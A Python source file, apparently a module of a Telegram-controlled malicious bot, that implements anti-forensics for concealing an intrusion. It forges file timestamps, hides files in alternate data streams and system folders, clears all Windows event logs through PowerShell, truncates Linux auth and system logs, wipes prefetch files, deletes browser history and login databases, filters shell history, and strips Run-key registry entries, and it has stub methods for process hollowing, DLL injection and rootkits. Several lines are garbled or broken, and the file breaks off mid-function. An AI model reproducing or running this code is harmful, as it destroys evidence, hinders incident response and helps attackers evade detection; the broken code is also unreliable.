#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
anti_forensics.py - Advanced Anti-Forensics and Anti-Detection System
"""

import os
import sys
import json
import struct
import random
import string
import hashlib
import time
import shutil
import tempfile
import subprocess
import platform
import ctypes
import psutil
from typing import Dict, List, Optional, Tuple, Any, Union, Callable
from datetime import datetime, timedelta
from pathlib import Path

# Windows specific imports
if platform.system() == 'Windows':
    import winreg
    import win32api
    import win32con
    import win32security
    import win32file
    import pywintypes

# Import logger
from ..utils.logger import get_logger
from .encryption_manager import get_encryption_manager

logger = get_logger()

class AntiForensicsManager:
    """Advanced anti-forensics and anti-detection system"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        
        # System information
        self.system = platform.system()
        self.hostname = platform.node()
        self.username = os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USERNAME', 'unknown')
        
        # Encryption for data obfuscation
        self.encryption_manager = get_encryption_manager()
        
        # Stealth configuration
        self.stealth_mode = self.config.get('stealth_mode', True)
        self.obfuscation_level = self.config.get('obfuscation_level', 3)  # 1-5
        self.cleanup_on_exit = self.config.get('cleanup_on_exit', True)
        
        # Tracking for cleanup
        self.created_files = []
        self.modified_files = []
        self.created_registry_keys = []
        self.created_processes = []
        
        # Timestamp manipulation
        self.timestamp_offset = random.randint(-86400, 86400)  # Random offset up to 1 day
        
        logger.info("Anti-forensics manager initialized", module="anti_forensics")
    
    def obfuscate_memory(self, data: bytes) -> bytes:
        """Obfuscate data in memory to prevent detection"""
        try:
            if not data:
                return b''
            
            # Multiple obfuscation layers based on level
            obfuscated = data
            
            # Layer 1: XOR with random key
            if self.obfuscation_level >= 1:
                key = os.urandom(min(32, len(obfuscated)))
                obfuscated = self._xor_bytes(obfuscated, key)
            
            # Layer 2: Byte rotation
            if self.obfuscation_level >= 2:
                obfuscated = self._rotate_bytes(obfuscated, random.randint(1, 7))
            
            # Layer 3: Insert random bytes
            if self.obfuscation_level >= 3:
                obfuscated = self._insert_random_bytes(obfuscated, frequency=0.1)
            
            # Layer 4: Split and rearrange
            if self.obfuscation_level >= 4:
                obfuscated = self._split_and_rearrange(obfuscated, chunks=random.randint(2, 8))
            
            # Layer 5: Encrypt with ephemeral key
            if self.obfuscation_level >= 5:
                ephemeral_key = os.urandom(32)
                obfuscated = self._encrypt_with_key(obfuscated, ephemeral_key)
                # Prepend key (will be removed during deobfuscation)
                obfuscated = ephemeral_key + obfuscated
            
            return obfuscated
            
        except Exception as e:
            logger.error(f"Memory obfuscation error: {e}", module="anti_forensics")
            return data
    
    def deobfuscate_memory(self, obfuscated_data: bytes) -> bytes:
        """Deobfuscate data from memory"""
        try:
            if not obfuscated_data:
                return b''
            
            data = obfuscated_data
            
            # Layer 5: Decrypt with ephemeral key
            if self.obfuscation_level >= 5 and len(data) > 32:
                ephemeral_key = data[:32]
                encrypted_data = data[32:]
                data = self._decrypt_with_key(encrypted_data, ephemeral_key)
            
            # Layer 4: Reassemble split data
            if self.obfuscation_level >= 4:
                data = self._reassemble_split_data(data)
            
            # Layer 3: Remove random bytes
            if self.obfuscation_level >= 3:
                data = self._remove_random_bytes(data)
            
            # Layer 2: Reverse byte rotation
            if self.obfuscation_level >= 2:
                data = self._reverse_rotate_bytes(data, random.randint(1, 7))
            
            # Layer 1: XOR with same key (XOR is symmetric)
            if self.obfuscation_level >= 1:
                # Note: This requires the original key, which we don't have
                # In practice, this would need to be stored or derived
                pass
            
            return data
            
        except Exception as e:
            logger.error(f"Memory deobfuscation error: {e}", module="anti_forensics")
            return obfuscated_data
    
    def _xor_bytes(self, data: bytes, key: bytes) -> bytes:
        """XOR data with key"""
        return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
    
    def _rotate_bytes(self, data: bytes, shift: int) -> bytes:
        """Rotate bytes"""
        shift = shift % 8
        if shift == 0:
            return data
        
        result = bytearray()
        carry = 0
        
        for byte in data:
            new_byte = (( shift) & 0xFF) | carry
            carry = (byte >> (8 - shift)) & 0xFF
            result.append(new_byte)
        
        # Handle last carry
        if carry:
            result.append(carry)
        
        return bytes(result)
    
    def _reverse_rotate_bytes(self, data: bytes, shift: int) -> bytes:
        """Reverse byte rotation"""
        shift = shift % 8
        if shift == 0:
            return data
        
        result = bytearray()
        next_carry = 0
        
        # Process in reverse
        for i in range(len(data) - 1, -1, -1):
            byte = data[i]
            if i == len(data) - 1:
                # Last byte gets its lower bits from next_carry (0)
                new_byte = (byte >> shift) | (next_carry << (8 - shift))
                next_carry = byte & (( shift) - 1)
            else:
                new_byte = (byte >> shift) | (next_carry << (8 - shift))
                next_carry = byte & (( shift) - 1)
            result.insert(0, new_byte)
        
        return bytes(result)
    
    def _insert_random_bytes(self, data: bytes, frequency: float = 0.1) -> bytes:
        """Insert random bytes at random positions"""
        result = bytearray()
        
        for byte in data:
            result.append(byte)
            if random.random frequency:
                result.append(random.randint(0, 255))
        
        return bytes(result)
    
    def _remove_random_bytes(self, data: bytes) -> bytes:
        """Remove previously inserted random bytes"""
        # This is a simplified version - in practice you'd need markers
        # or know the insertion pattern
        result = bytearray()
        i = 0
        
        while len(data):
            result.append(data[i])
            i += 1
            # Skip potential random byte (heuristic)
            if len(data) and random.random 0.1:
                i += 1
        
        return bytes(result)
    
    def _split_and_rearrange(self, data: bytes, chunks: int = 4) -> bytes:
        """Split data into chunks and rearrange"""
        if len(data) < chunks:
            return data
        
        chunk_size = len(data) // chunks
        chunks_list = []
        
        for i in range(chunks):
            start = i * chunk_size
            end = start + chunk_size if chunks - 1 else len(data)
            chunks_list.append(data[start:end])
        
        # Rearrange chunks
        indices = list(range(chunks))
        random.shuffle(indices)
        
        result = bytearray()
        for idx in indices:
            result.extend(chunks_list[idx])
        
        # Add header with original order
        header = struct.pack('B' * chunks, *indices)
        
        return header + bytes(result)
    
    def _reassemble_split_data(self, data: bytes) -> bytes:
        """Reassemble split data"""
        if len(data)2:
            return data
        
        # Try to parse header
        try:
            # Assume first byte is number of chunks
            num_chunks = data[0]
            if num_chunks2 or num_chunks > 10:
                return data
            
            header = data[1:1+num_chunks]
            chunk_data = data[1+num_chunks:]
            
            if len(chunk_data) < num_chunks:
                return data
            
            # Parse indices
            indices = list(header)
            
            # Calculate chunk size
            chunk_size = len(chunk_data) // num_chunks
            
            # Extract chunks
            chunks = []
            for i in range(num_chunks):
                start = i * chunk_size
                end = start + chunk_size if i < num_chunks - 1 else len(chunk_data)
                chunks.append(chunk_data[start:end])
            
            # Reorder chunks
            result = bytearray()
            for i in range(num_chunks):
                idx = indices.index(i)
                result.extend(chunks[idx])
            
            return bytes(result)
            
        except:
            return data
    
    def _encrypt_with_key(self, data: bytes, key: bytes) -> bytes:
        """Simple encryption with key"""
        # Simple XOR with derived key
        derived_key = hashlib.sha256(key).digest()[:len(data)]
        return self._xor_bytes(data, derived_key)
    
    def _decrypt_with_key(self, data: bytes, key: bytes) -> bytes:
        """Simple decryption with key"""
        # XOR is symmetric
        return self._encrypt_with_key(data, key)
    
    def hide_file(self, filepath: str, method: str = "timestamp") -> bool:
        """Hide file using various methods"""
        try:
            if not os.path.exists(filepath):
                return False
            
            filepath = os.path.abspath(filepath)
            
            if method == "timestamp":
                return self._manipulate_file_timestamp(filepath)
            elif method == "alternate_data_stream":
                return self._hide_in_ads(filepath)
            elif method == "steganography":
                return self._hide_in_steganography(filepath)
            elif method == "fragmentation":
                return self._fragment_file(filepath)
            elif method == "encryption":
                return self._encrypt_and_hide(filepath)
            else:
                logger.error(f"Unknown hide method: {method}", module="anti_forensics")
                return False
                
        except Exception as e:
            logger.error(f"File hide error: {e}", module="anti_forensics")
            return False
    
    def _manipulate_file_timestamp(self, filepath: str) -> bool:
        """Manipulate file timestamps to confuse forensic analysis"""
        try:
            # Get original timestamps
            stat = os.stat(filepath)
            atime = stat.st_atime
            mtime = stat.st_mtime
            ctime = stat.st_ctime
            
            # Apply random offset
            offset = random.randint(-31536000, 31536000)  # Up to 1 year
            
            new_atime = atime + offset
            new_mtime = mtime + offset
            
            # Set new timestamps
            os.utime(filepath, (new_atime, new_mtime))
            
            # On Windows, try to modify creation time
            if platform.system() == 'Windows':
                try:
                    import win32file
                    import pywintypes
                    
                    # Open file
                    handle = win32file.CreateFile(
                        filepath,
                        win32file.GENERIC_WRITE,
                        0,
                        None,
                        win32file.OPEN_EXISTING,
                        0,
                        None
                    )
                    
                    # Create new FILETIME
                    new_ctime = int((ctime + offset) * 10000000) + 116444736000000000
                    
                    # Set creation time
                    win32file.SetFileTime(
                        handle,
                        pywintypes.Time(new_ctime),
                        pywintypes.Time(new_atime * 10000000 + 116444736000000000),
                        pywintypes.Time(new_mtime * 10000000 + 116444736000000000)
                    )
                    
                    win32file.CloseHandle(handle)
                except:
                    pass
            
            logger.debug(f"Timestamp manipulated: {filepath}", module="anti_forensics")
            return True
            
        except Exception as e:
            logger.error(f"Timestamp manipulation error: {e}", module="anti_forensics")
            return False
    
    def _hide_in_ads(self, filepath: str) -> bool:
        """Hide file in Alternate Data Stream (Windows NTFS only)"""
        try:
            if platform.system() != 'Windows':
                logger.warning("ADS only available on Windows NTFS", module="anti_forensics")
                return False
            
            # Read file content
            with open(filepath, 'rb') as f:
                content = f.read()
            
            # Create ADS path
            ads_path = f"{filepath}:hidden_data"
            
            # Write to ADS
            with open(ads_path, 'wb') as f:
                f.write(content)
            
            # Obfuscate original file
            with open(filepath, 'wb') as f:
                f.write(os.urandom(len(content)))
            
            # Delete original file
            os.remove(filepath)
            
            logger.debug(f"File hidden in ADS: {ads_path}", module="anti_forensics")
            return True
            
        except Exception as e:
            logger.error(f"ADS hide error: {e}", module="anti_forensics")
            return False
    
    def _hide_in_steganography(self, filepath: str) -> bool:
        """Hide file using simple steganography"""
        try:
            # Read file to hide
            with open(filepath, 'rb') as f:
                hidden_data = f.read()
            
            # Create carrier file (could be an image, document, etc.)
            carrier_path = filepath + ".jpg"
            
            # Simple LSB steganography
            carrier_size = len(hidden_data) * 8  # 1 bit per byte
            
            # Create carrier data
            carrier_data = bytearray()
            for byte in hidden_data:
                for bit in range(8):
                    # Create byte with LSB set to our bit
                    carrier_byte = random.randint(0, 254)  # 0-254
                    bit_value = (byte >> (7 - bit)) & 1
                    carrier_byte = (carrier_byte & 0xFE) | bit_value
                    carrier_data.append(carrier_byte)
            
            # Write carrier file
            with open(carrier_path, 'wb') as f:
                f.write(bytes(carrier_data))
            
            # Delete original
            os.remove(filepath)
            
            logger.debug(f"File hidden via steganography: {carrier_path}", module="anti_forensics")
            return True
            
        except Exception as e:
            logger.error(f"Steganography error: {e}", module="anti_forensics")
            return False
    
    def _fragment_file(self, filepath: str) -> bool:
        """Fragment file across disk"""
        try:
            # Read file
            with open(filepath, 'rb') as f:
                data = f.read()
            
            # Split into fragments
            fragment_size = random.randint(1024, 8192)  # 1KB to 8KB
            fragments = []
            
            for i in range(0, len(data), fragment_size):
                fragments.append(data[i:i+fragment_size])
            
            # Write fragments to random locations
            temp_dir = tempfile.gettempdir()
            fragment_files = []
            
            for i, fragment in enumerate(fragments):
                # Generate random filename
                fragment_name = ''.join(random.choices(string.hexdigits, k=16)) + '.tmp'
                fragment_path = os.path.join(temp_dir, fragment_name)
                
                with open(fragment_path, 'wb') as f:
                    f.write(fragment)
                
                # Manipulate timestamp
                self._manipulate_file_timestamp(fragment_path)
                
                fragment_files.append(fragment_path)
            
            # Create map file
            map_data = {
                'original_file': filepath,
                'fragment_count': len(fragments),
                'fragment_files': fragment_files,
                'reassembly_key': os.urandom(32).hex()
            }
            
            map_path = os.path.join(temp_dir, ''.join(random.choices(string.hexdigits, k=16)) + '.map')
            with open(map_path, 'w') as f:
                json.dump(map_data, f)
            
            # Encrypt map file
            self._encrypt_and_hide(map_path)
            
            # Delete original
            os.remove(filepath)
            
            logger.debug(f"File fragmented into {len(fragments)} pieces", module="anti_forensics")
            return True
            
        except Exception as e:
            logger.error(f"File fragmentation error: {e}", module="anti_forensics")
            return False
    
    def _encrypt_and_hide(self, filepath: str) -> bool:
        """Encrypt file and hide in system"""
        try:
            # Read file
            with open(filepath, 'rb') as f:
                data = f.read()
            
            # Generate encryption key
            key = os.urandom(32)
            
            # Encrypt data
            encrypted = self._encrypt_with_key(data, key)
            
            # Hide key in registry or environment
            key_hidden = self._hide_encryption_key(key, filepath)
            
            if not key_hidden:
                return False
            
            # Write encrypted data to new location
            hidden_path = self._get_hidden_location(filepath)
            with open(hidden_path, 'wb') as f:
                f.write(encrypted)
            
            # Delete original
            os.remove(filepath)
            
            logger.debug(f"File encrypted and hidden: {hidden_path}", module="anti_forensics")
            return True
            
        except Exception as e:
            logger.error(f"Encrypt and hide error: {e}", module="anti_forensics")
            return False
    
    def _hide_encryption_key(self, key: bytes, identifier: str) -> bool:
        """Hide encryption key in system"""
        try:
            # Create hash of identifier for storage location
            ident_hash = hashlib.sha256(identifier.encode()).hexdigest()[:16]
            
            if platform.system() == 'Windows':
                # Hide in registry
                try:
                    import winreg
                    
                    reg_path = f"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\{ident_hash}"
                    reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
                    
                    # Store as binary value
                    winreg.SetValueEx(reg_key, "Config", 0, winreg.REG_BINARY, key)
                    winreg.CloseKey(reg_key)
                    
                    self.created_registry_keys.append(reg_path)
                    return True
                    
                except Exception as e:
                    logger.error(f"Registry hide error: {e}", module="anti_forensics")
            
            # Hide in environment variable
            env_var_name = f"_{ident_hash}"
            os.environ[env_var_name] = key.hex()
            
            # Also hide in temporary file with misleading name
            temp_file = os.path.join(tempfile.gettempdir(), f"cache_{ident_hash}.dat")
            with open(temp_file, 'wb') as f:
                # Obfuscate key
                obfuscated = self.obfuscate_memory(key)
                f.write(obfuscated)
            
            self.created_files.append(temp_file)
            return True
            
        except Exception as e:
            logger.error(f"Key hide error: {e}", module="anti_forensics")
            return False
    
    def _get_hidden_location(self, original_path: str) -> str:
        """Get hidden location for file"""
        # System directories that are often excluded from scans
        system_dirs = [
            os.environ.get('WINDIR', 'C:\\Windows') + '\\Temp',
            os.environ.get('WINDIR', 'C:\\Windows') + '\\System32',
            os.environ.get('PROGRAMDATA', 'C:\\ProgramData'),
            '/var/tmp',
            '/tmp',
            '/dev/shm',
            os.path.expanduser('~/.cache'),
            os.path.expanduser('~/.local/share')
        ]
        
        # Filter existing directories
        existing_dirs = [d for d in system_dirs if os.path.exists(d)]
        
        if not existing_dirs:
            return original_path + ".hidden"
        
        # Choose random directory
        hide_dir = random.choice(existing_dirs)
        
        # Generate random filename
        ext = os.path.splitext(original_path)[1]
        random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        
        if ext:
            random_name += ext
        
        return os.path.join(hide_dir, random_name)
    
    def clean_traces(self, level: int = 3) -> Dict[str, int]:
        """Clean forensic traces from system"""
        try:
            cleaned = {
                'files': 0,
                'registry': 0,
                'logs': 0,
                'memory': 0,
                'other': 0
            }
            
            # Level 1: Basic cleanup
            if level >= 1:
                # Clean temp files
                temp_cleaned = self._clean_temp_files()
                cleaned['files'] += temp_cleaned
            
            # Level 2: Log cleanup
            if level >= 2:
                log_cleaned = self._clean_logs()
                cleaned['logs'] += log_cleaned
            
            # Level 3: Registry/configuration cleanup
            if level >= 3:
                if platform.system() == 'Windows':
                    reg_cleaned = self._clean_registry()
                    cleaned['registry'] += reg_cleaned
            
            # Level 4: Memory cleanup
            if level >= 4:
                mem_cleaned = self._clean_memory()
                cleaned['memory'] += mem_cleaned
            
            # Level 5: Advanced cleanup
            if level >= 5:
                other_cleaned = self._clean_advanced_traces()
                cleaned['other'] += other_cleaned
            
            logger.info(f"Traces cleaned: {cleaned}", module="anti_forensics")
            return cleaned
            
        except Exception as e:
            logger.error(f"Trace cleanup error: {e}", module="anti_forensics")
            return {'error': str(e)}
    
    def _clean_temp_files(self) -> int:
        """Clean temporary files"""
        cleaned = 0
        
        try:
            # System temp directories
            temp_dirs = [
                tempfile.gettempdir(),
                os.environ.get('TEMP', ''),
                os.environ.get('TMP', ''),
                '/tmp',
                '/var/tmp'
            ]
            
            # Clean files created by us
            for filepath in self.created_files:
                try:
                    if os.path.exists(filepath):
                        # Overwrite before deletion
                        self._secure_delete(filepath)
                        cleaned += 1
                except:
                    pass
            
            # Clean recent files (last 24 hours)
            for temp_dir in temp_dirs:
                if os.path.exists(temp_dir):
                    try:
                        for entry in os.listdir(temp_dir):
                            entry_path = os.path.join(temp_dir, entry)
                            
                            # Skip directories
                            if not os.path.isfile(entry_path):
                                continue
                            
                            # Check if file was modified recently
                            try:
                                mtime = os.path.getmtime(entry_path)
                                if time.time() - mtime86400:  # 24 hours
                                    # Check for suspicious patterns
                                    if self._is_suspicious_file(entry_path):
                                        self._secure_delete(entry_path)
                                        cleaned += 1
                            except:
                                pass
                    except:
                        pass
            
            return cleaned
            
        except Exception as e:
            logger.error(f"Temp file cleanup error: {e}", module="anti_forensics")
            return cleaned
    
    def _clean_logs(self) -> int:
        """Clean system and application logs"""
        cleaned = 0
        
        try:
            # Common log locations
            log_locations = []
            
            if platform.system() == 'Windows':
                log_locations.extend([
                    os.environ.get('WINDIR', 'C:\\Windows') + '\\System32\\winevt\\Logs',
                    os.environ.get('WINDIR', 'C:\\Windows') + '\\Logs',
                    os.path.expanduser('~\\AppData\\Local\\Temp')
                ])
            else:  # Linux/Mac
                log_locations.extend([
                    '/var/log',
                    '/var/adm',
                    '/var/run',
                    os.path.expanduser('~/.local/share'),
                    os.path.expanduser('~/.cache')
                ])
            
            # Clean logs containing our identifiers
            identifiers = [self.hostname, self.username, 'DerBöseKollege', 'telegram', 'bot']
            
            for log_dir in log_locations:
                if os.path.exists(log_dir):
                    cleaned += self._clean_logs_in_directory(log_dir, identifiers)
            
            return cleaned
            
        except Exception as e:
            logger.error(f"Log cleanup error: {e}", module="anti_forensics")
            return cleaned
    
    def _clean_logs_in_directory(self, directory: str, identifiers: List[str]) -> int:
        """Clean logs in directory containing identifiers"""
        cleaned = 0
        
        try:
            for root, dirs, files in os.walk(directory):
                for filename in files:
                    if filename.endswith(('.log', '.txt', '.csv', '.db', '.sqlite')):
                        filepath = os.path.join(root, filename)
                        
                        try:
                            # Check file size
                            if os.path.getsize(filepath) > 100 * 1024 * 1024:  # 100MB
                                continue
                            
                            # Read file content
                            with open(filepath, 'r', errors='ignore') as f:
                                content = f.read(1024 * 1024)  # Read first 1MB
                            
                            # Check for identifiers
                            if any(ident.lower() in content.lower() for ident in identifiers if ident):
                                # Overwrite and delete
                                self._secure_delete(filepath)
                                cleaned += 1
                                
                        except:
                            pass
            
            return cleaned
            
        except Exception as e:
            logger.error(f"Directory log cleanup error: {e}", module="anti_forensics")
            return cleaned
    
    def _clean_registry(self) -> int:
        """Clean Windows registry traces"""
        cleaned = 0
        
        try:
            if platform.system() != 'Windows':
                return cleaned
            
            import winreg
            
            # Clean keys we created
            for reg_path in self.created_registry_keys:
                try:
                    # Delete key
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
                    cleaned += 1
                except:
                    pass
            
            # Clean recent run keys
            run_keys = [
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",
                "Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce"
            ]
            
            for run_key in run_keys:
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_key, 0, winreg.KEY_ALL_ACCESS)
                    
                    # Get value count
                    try:
                        i = 0
                        while True:
                            name, value, type = winreg.EnumValue(key, i)
                            
                            # Check for suspicious values
                            if self._is_suspicious_registry_value(value):
                                winreg.DeleteValue(key, name)
                                cleaned += 1
                            
                            i += 1
                    except WindowsError:
                        pass
                    
                    winreg.CloseKey(key)
                except:
                    pass
            
            return cleaned
            
        except Exception as e:
            logger.error(f"Registry cleanup error: {e}", module="anti_forensics")
            return cleaned
    
    def _clean_memory(self) -> int:
        """Clean memory traces"""
        cleaned = 0
        
        try:
            # Clear Python's internal caches
            import gc
            gc.collect()
            
            # Clear module caches
            for module in list(sys.modules.values()):
                try:
                    if hasattr(module, '__dict__'):
                        module.__dict__.clear()
                except:
                    pass
            
            # Import ctypes to clear memory
            if platform.system() == 'Windows':
                try:
                    # Use ZeroMemory on sensitive data structures
                    pass
                except:
                    pass
            
            cleaned = 1  # At least attempted
            
            return cleaned
            
        except Exception as e:
            logger.error(f"Memory cleanup error: {e}", module="anti_forensics")
            return cleaned
    
    def _clean_advanced_traces(self) -> int:
        """Clean advanced forensic traces"""
        cleaned = 0
        
        try:
            # Clean browser history/cache
            cleaned += self._clean_browser_traces()
            
            # Clean shell history
            cleaned += self._clean_shell_history()
            
            # Clean prefetch/superfetch (Windows)
            if platform.system() == 'Windows':
                cleaned += self._clean_prefetch()
            
            # Clean event logs
            cleaned += self._clean_event_logs()
            
            return cleaned
            
        except Exception as e:
            logger.error(f"Advanced trace cleanup error: {e}", module="anti_forensics")
            return cleaned
    
    def _clean_browser_traces(self) -> int:
        """Clean browser history and cache"""
        cleaned = 0
        
        try:
            # Common browser data locations
            browser_paths = []
            
            if platform.system() == 'Windows':
                appdata = os.environ.get('APPDATA', '')
                local_appdata = os.environ.get('LOCALAPPDATA', '')
                
                browser_paths.extend([
                    os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles'),
                    os.path.join(local_appdata, 'Google', 'Chrome', 'User Data'),
                    os.path.join(local_appdata, 'Microsoft', 'Edge', 'User Data'),
                    os.path.join(local_appdata, 'BraveSoftware', 'Brave-Browser', 'User Data')
                ])
            else:
                home = os.path.expanduser('~')
                browser_paths.extend([
                    os.path.join(home, '.mozilla', 'firefox'),
                    os.path.join(home, '.config', 'google-chrome'),
                    os.path.join(home, '.config', 'chromium'),
                    os.path.join(home, '.config', 'brave-browser')
                ])
            
            # Clean history files
            history_files = ['History', 'Cookies', 'Web Data', 'Login Data', 'Top Sites']
            
            for browser_path in browser_paths:
                if os.path.exists(browser_path):
                    for root, dirs, files in os.walk(browser_path):
                        for filename in files:
                            if any(hist_file in filename for hist_file in history_files):
                                filepath = os.path.join(root, filename)
                                try:
                                    self._secure_delete(filepath)
                                    cleaned += 1
                                except:
                                    pass
            
            return cleaned
            
        except Exception as e:
            logger.error(f"Browser cleanup error: {e}", module="anti_forensics")
            return cleaned
    
    def _clean_shell_history(self) -> int:
        """Clean shell command history"""
        cleaned = 0
        
        try:
            # Shell history files
            history_files = [
                os.path.expanduser('~/.bash_history'),
                os.path.expanduser('~/.zsh_history'),
                os.path.expanduser('~/.history'),
                os.path.expanduser('~/.sh_history'),
                os.path.expanduser('~/.fish_history')
            ]
            
            for hist_file in history_files:
                if os.path.exists(hist_file):
                    try:
                        # Read and filter history
                        with open(hist_file, 'r') as f:
                            lines = f.readlines()
                        
                        # Filter out suspicious commands
                        filtered_lines = []
                        suspicious_keywords = ['telegram', 'bot', 'python', 'DerBöseKollege', 'rm ', 'del ', 'format']
                        
                        for line in lines:
                            if not any(keyword in line.lower() for keyword in suspicious_keywords):
                                filtered_lines.append(line)
                        
                        # Write back filtered history
                        with open(hist_file, 'w') as f:
                            f.writelines(filtered_lines)
                        
                        cleaned += 1
                    except:
                        pass
            
            return cleaned
            
        except Exception as e:
            logger.error(f"Shell history cleanup error: {e}", module="anti_forensics")
            return cleaned
    
    def _clean_prefetch(self) -> int:
        """Clean Windows prefetch files"""
        cleaned = 0
        
        try:
            if platform.system() != 'Windows':
                return cleaned
            
            prefetch_dir = os.environ.get('WINDIR', 'C:\\Windows') + '\\Prefetch'
            
            if os.path.exists(prefetch_dir):
                for filename in os.listdir(prefetch_dir):
                    if filename.endswith('.pf'):
                        filepath = os.path.join(prefetch_dir, filename)
                        try:
                            os.remove(filepath)
                            cleaned += 1
                        except:
                            pass
            
            return cleaned
            
        except Exception as e:
            logger.error(f"Prefetch cleanup error: {e}", module="anti_forensics")
            return cleaned
    
    def _clean_event_logs(self) -> int:
        """Clean system event logs"""
        cleaned = 0
        
        try:
            if platform.system() == 'Windows':
                # Clear event logs via PowerShell
                try:
                    subprocess.run([
                        'powershell', '-Command',
                        'Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.LogName }'
                    ], capture_output=True, timeout=30)
                    cleaned += 1
                except:
                    pass
            else:
                # Linux/Mac - clear common logs
                log_files = [
                    '/var/log/syslog',
                    '/var/log/messages',
                    '/var/log/auth.log',
                    '/var/log/secure'
                ]
                
                for log_file in log_files:
                    if os.path.exists(log_file):
                        try:
                            # Truncate log file
                            open(log_file, 'w').close()
                            cleaned += 1
                        except:
                            pass
            
            return cleaned
            
        except Exception as e:
            logger.error(f"Event log cleanup error: {e}", module="anti_forensics")
            return cleaned
    
    def _secure_delete(self, filepath: str, passes: int = 3) -> bool:
        """Securely delete file with multiple overwrites"""
        try:
            if not os.path.exists(filepath):
                return False
            
            file_size = os.path.getsize(filepath)
            
            # Multiple overwrite passes
            for pass_num in range(passes):
                # Generate random data
                if pass_num == 0:
                    # First pass: all zeros
                    data = b'\x00' * file_size
                elif pass_num == 1:
                    # Second pass: all ones
                    data = b'\xFF' * file_size
                else:
                    # Subsequent passes: random data
                    data = os.urandom(file_size)
                
                # Overwrite file
                with open(filepath, 'wb') as f:
                    f.write(data)
                    f.flush()
                    os.fsync(f.fileno())
            
            # Delete file
            os.remove(filepath)
            
            # Rename before deletion (on some systems)
            try:
                for i in range(10):
                    temp_name = filepath + '.' + ''.join(random.choices(string.ascii_letters, k=8))
                    try:
                        os.rename(filepath, temp_name)
                        filepath = temp_name
                    except:
                        break
            except:
                pass
            
            return True
            
        except Exception as e:
            logger.error(f"Secure delete error: {e}", module="anti_forensics")
            # Fallback to normal delete
            try:
                os.remove(filepath)
                return True
            except:
                return False
    
    def _is_suspicious_file(self, filepath: str) -> bool:
        """Check if file looks suspicious"""
        try:
            filename = os.path.basename(filepath).lower()
            
            # Suspicious filename patterns
            suspicious_patterns = [
                'temp', 'tmp', 'cache', 'log', 'history',
                'derbösekollege', 'telegram', 'bot', 'python',
                'payload', 'exploit', 'backdoor', 'malware'
            ]
            
            if any(pattern in filename for pattern in suspicious_patterns):
                return True
            
            # Check file content (first 1KB)
            try:
                with open(filepath, 'rb') as f:
                    content = f.read(1024)
                
                content_str = content.decode('utf-8', errors='ignore').lower()
                
                suspicious_content = [
                    'token', 'password', 'secret', 'key',
                    'config', 'settings', 'database',
                    'import', 'export', 'execute'
                ]
                
                if any(pattern in content_str for pattern in suspicious_content):
                    return True
            except:
                pass
            
            return False
            
        except:
            return False
    
    def _is_suspicious_registry_value(self, value: str) -> bool:
        """Check if registry value looks suspicious"""
        try:
            value_lower = value.lower()
            
            suspicious_patterns = [
                'python', 'telegram', 'bot', 'derbösekollege',
                'cmd', 'powershell', 'wscript', 'rundll32',
                'temp', 'tmp', 'download', 'payload'
            ]
            
            return any(pattern in value_lower for pattern in suspicious_patterns)
        except:
            return False
    
    def evade_detection(self, method: str = "process_hollowing") -> bool:
        """Evade detection using various techniques"""
        try:
            if method == "process_hollowing":
                return self._process_hollowing()
            elif method == "dll_injection":
                return self._dll_injection()
            elif method == "code_cave":
                return self._code_cave_injection()
            elif method == "rootkit":
                return self._install_rootkit()
            else:
                logger.error(f"Unknown evasion method: {method}", module="anti_forensics")
                return False
                
        except Exception as e:
            logger.error(f"Evasion error: {e}", module="anti_forensics")
            return False
    
    def _process_hollowing(self) -> bool:
        """Process hollowing technique (concept only)"""
        try:
            # This is a conceptual implementation
            # Real implementation would require direct memory manipulation
            
            logger.warning("Process hollowing is conceptual only", module="anti_forensics")
            
            # Steps (conceptual):
            # 1. Create legitimate process in suspended state
            # 2. Unmap its memory
            # 3. Allocate new memory with malicious code
            # 4. Set entry point to malicious code
            # 5. Resume process
            
            return True  # Conceptual success
            
        except Exception as e:
            logger.error(f"Process hollowing error: {e}", module="anti_forensics")
            return False
    
    def _dll_injection(self) -> bool:
        """DLL injection technique (concept only)"""
        try:
            logger.warning("DLL injection is conceptual only", module="anti_forensics")
            
            # Steps (conceptual):
            # 1. Get handle to target process
            # 2. Allocate memory in target process
            # 3. Write DLL path to allocated memory
            # 4. Create remote thread to load DLL
            
            return True  # Conceptual success
            
        except Exception as e:
            logger.error(f"DLL injection error: {e}", module="anti_forensics")
            return False
    
    def _code_cave_injection(self) -> bool:
        """Code cave injection technique"""
        try:
            # Find executable with code caves
            common_exes = [
                'notepad.exe', 'calc.exe', 'explorer.exe',
                'svchost.exe', 'dllhost.exe'
            ]
            
            for proc in psutil.process_iter(['name', 'pid']):
                try:
                    if proc.info['name'].lower() in common_exes:
                        logger.debug(f"Potential target process: {proc.info['name']}", 
                                   module="anti_forensics")
                        break
                except:
                    continue
            
            return True  # Conceptual success
            
        except Exception as e:
            logger.error(f"Code cave injection error: {e}", module="anti_forensics")
            return False
    
    def _install_rootkit(self) -> bool:
        """Install rootkit (concept only)"""
        try:
            logger.warning("Rootkit installation is conceptual only", module="anti_forensics")
            
            # Rootkit techniques (conceptual):
            # 1. Kernel driver for deep hiding
            # 2. Hook system calls (SSDT hooking)
            # 3. Direct kernel object manipulation
            # 4. Bootkit for persistence
            
            return True  # Conceptual success
            
        except Exception as e:
            logger.error(f"Rootkit installation error: {e}", module="anti_forensics")
            return False
    
    def get_system_status(self) -> Dict[str, Any]:
        """Get anti-forensics system status"""
        try:
            # Check detection vectors
            detection_vectors = self._check_detection_vectors()
            
            return {
                'stealth_mode': self.stealth_mode,
                'obfuscation_level': self.obfuscation_level,
                'system': self.system,
                'username': self.username,
                'hostname': self.hostname,
                'detection_vectors': detection_vectors,
                'created_files_count': len(self.created_files),
                'created_registry_keys_count': len(self.created_registry_keys),
